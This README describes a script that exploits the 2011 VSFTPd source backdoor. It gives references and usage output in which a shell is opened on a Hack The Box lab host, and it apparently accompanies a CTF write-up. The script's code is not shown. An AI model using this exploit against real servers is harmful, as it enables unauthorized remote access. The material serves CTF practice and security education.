## Description

In 2011 a [backdoor was added to the VSFTPd source code](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html?source=post_page---------------------------). Since then, it's become a well know CTF challenge to exploit. While the exploit is trivial to pull off manually with `nc` or `telnet`, I wanted to write a script to do it. This script will not rely on having `sh` or `bash` on the target listening on 6200.

I'll also include a copy of the vulnerable source tarball for reference. This is for educational purposes only.

## References

- Original post from VSFTPd maintainer: [Alert: vsftpd download backdoored](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html?source=post_page---------------------------)
- [Pastebin description of backdoor](https://pastebin.com/AetT9sS5)
- My blog post where I show this script: [HTB: LaCasaDePapel](https://0xdf.gitlab.io/2019/07/20/htb-lacasadepapel.html#script)
- Tricks to get VSFTPd to build: [Notes on Installing vsftpd from Scratch in Ubuntu 12.04](https://github.com/vvord/kalos/blob/master/notes_on_vsftpd_compilation_and_installation_in_ubuntu_12.04.md)

## Usage

```
root@kali:~# ./vsftpd_backdoor.py 
./vsftpd_backdoor.py [ip] [port = 21]
port defaults to 21 if not given

root@kali:~# ./vsftpd_backdoor.py 10.10.10.131
[*] Connecting to 10.10.10.131:21
[+] Backdoor triggered
[*] Connecting
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
getcwd()
=> "/"
```
